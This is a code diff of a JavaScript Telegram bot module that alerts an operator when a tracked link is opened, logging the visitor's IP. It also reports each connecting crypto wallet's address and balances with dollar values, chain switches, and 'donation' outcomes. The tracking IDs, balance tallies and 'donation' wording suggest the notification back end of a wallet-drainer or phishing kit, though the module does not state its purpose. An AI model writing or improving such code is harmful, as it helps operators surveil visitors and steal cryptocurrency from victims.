@@ -2,7 +2,6 @@
 import { subscribe } from "./notify.js";
 import TelegramBot from "node-telegram-bot-api";
 
-// 🔧 put your Telegram bot details here
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
@@ -17,12 +16,11 @@ function sendMessage(text) {
   }
 }
 
-// ---- Subscribe to events ----
 export function initBot() {
   // 1. Link Opened
   subscribe("LINK_OPENED", ({ openedUrl, visitorIp, trackingId }) => {
     sendMessage(
-      `\n📢 *LINK OPENED*\n-------------------------\n📄 URL: ${openedUrl}\n🌍 IP: ${visitorIp}\n🆔 Tracking ID: \`${trackingId}\``
+      `\n📢 *LINK OPENED*\n-------------------------\n📄 URL: ${openedUrl}\n🌍 IP: ${visitorIp || "N/A"}\n🆔 Tracking ID: \`${trackingId}\``
     );
   });
 
@@ -30,7 +28,7 @@ export function initBot() {
   subscribe("WALLET_CONNECTED", ({ walletAddress, trackingId, balances, grandTotal }) => {
     let msg = `\n✅ *WALLET CONNECTED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\`\n\n💰 *Balances:*\n`;
     balances.forEach(chain => {
-      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native}\n   • Tokens:\n`;
+      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native} ($${chain.nativeValue})\n   • Tokens:\n`;
       chain.tokens.forEach(t => {
         msg += `      *${t.name}*: ${t.amount} ($${t.value})\n`;
       });
@@ -50,15 +48,15 @@ export function initBot() {
   // 4. Chain Switch
   subscribe("CHAIN_SWITCH", ({ trackingId, oldChain, newChain }) => {
     sendMessage(
-      `\n🔄 *CHAIN SWITCHED*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n🌐 From: *${oldChain}* → *${newChain}*`
+      `\n🔄 *CHAIN SWITCHED*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n🌐 From: *${oldChain || "?"}* → *${newChain}*`
     );
   });
 
-  // 5. Donation Results (old "completed")
-  subscribe("DONATION_RESULTS", ({ walletAddress, trackingId, balances, donationSummary }) => {
+  // 5. Donation Results
+  subscribe("DONATION_MADE", ({ walletAddress, trackingId, balances, donationSummary }) => {
     let msg = `\n🎉 *DONATION RESULTS*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n👛 Address: \`${walletAddress}\`\n\n💰 *Updated Balances:*\n`;
     balances.forEach(chain => {
-      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native}\n   • Tokens:\n`;
+      msg += `🌐 *${chain.name}*\n   • Native: ${chain.native} ($${chain.nativeValue})\n   • Tokens:\n`;
       chain.tokens.forEach(t => {
         msg += `      *${t.name}*: ${t.amount} ($${t.value})\n`;
       });
@@ -71,14 +69,14 @@ export function initBot() {
     sendMessage(msg);
   });
 
-  // 6. Donation Completed (was old "wallet disconnected" after flow)
+  // 6. Donation Completed
   subscribe("DONATION_COMPLETED", ({ walletAddress, trackingId }) => {
     sendMessage(
       `\n🏁 *DONATION COMPLETED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``
     );
   });
 
-  // 7. Wallet Disconnected (new, real disconnect)
+  // 7. Wallet Disconnected
   subscribe("WALLET_DISCONNECTED", ({ walletAddress, trackingId }) => {
     sendMessage(
       `\n❌ *WALLET DISCONNECTED*\n-------------------------\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``
